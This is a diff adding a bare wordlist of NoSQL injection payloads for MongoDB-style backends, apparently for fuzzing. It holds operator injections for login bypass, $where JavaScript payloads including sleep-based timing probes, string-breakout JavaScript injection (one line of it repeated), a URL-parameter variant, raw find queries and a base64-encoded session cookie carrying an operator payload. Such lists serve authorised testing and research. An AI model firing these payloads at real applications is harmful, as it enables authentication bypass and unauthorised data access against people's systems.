@@ -1,0 +1,20 @@
+{"username":{"$ne":"invaliduser"}}
+{"username":{"$eq":"admin"}}
+{"password":{"$regex":"^a"}}
+{"username":{"$gt":""}}
+{"username":{"$in":["admin", "user", "test"]}}
+{"$where":"this.username == 'admin'"}
+{"$where":"sleep(5000)"}
+{"$where":"function(){return 1;}"}
+{"$where":"function(){sleep(5000)}"}
+{"username":{"$exists":true}}
+';return(true);var a='
+';return(true);var a='
+{"$gt":""}
+{"$ne":""}
+{"$nin":[null]}
+"username";{"$gt":""}
+password[$ne]=
+db.injection.find({$where: "this.username == 'admin'"})
+db.injection.find({username: {$regex: '^adm'}})
+session=eyAidXNlcm5hbWUiOnsNCiAgICAgICIkbmUiOiAiYWRtaW4iIH19
